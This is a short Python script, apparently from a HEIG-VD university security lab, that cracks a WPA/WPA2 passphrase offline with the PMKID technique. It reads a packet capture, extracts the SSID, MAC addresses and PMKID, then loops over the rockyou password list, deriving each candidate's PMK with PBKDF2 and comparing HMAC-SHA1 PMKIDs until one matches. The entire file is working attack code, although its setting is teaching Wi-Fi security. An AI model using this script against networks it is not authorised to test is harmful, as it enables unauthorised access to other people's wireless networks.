#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid        = wpa[0].info
APmac       = a2b_hex(wpa[145].addr2.replace(':',''))
Clientmac   = a2b_hex(wpa[145].addr1.replace(':',''))
PMKID       = hexlify(wpa[145].load[101:])


print("SSID :", ssid.decode("utf-8"))
print("AP Mac :", b2a_hex(APmac).decode("utf-8"))
print("Client Mac :", b2a_hex(Clientmac).decode("utf-8"))

#Lecture du fichier de mdp
mdpFile = open('rockyou-65.txt', 'r') 
lines = mdpFile.readlines()

#Test de tous les mots de passe de la liste
for line in lines :
    
    password = str.encode(line[:-1])
    pmk = pbkdf2(hashlib.sha1,password, ssid, 4096, 32)
    pmkid = hmac.new(pmk, str.encode("PMK Name") + APmac + Clientmac, hashlib.sha1).hexdigest()[:32]
    print(password.decode("utf-8"), pmkid, PMKID.decode("utf-8") )
    
    #Comparaison du PMKID (trouvé dans le fichier pcap) et le PMKID générer avec le mot de passe de la liste 
    if(pmkid == PMKID.decode("utf-8") ):
        print("The passephrase is " + line)
        exit(0)
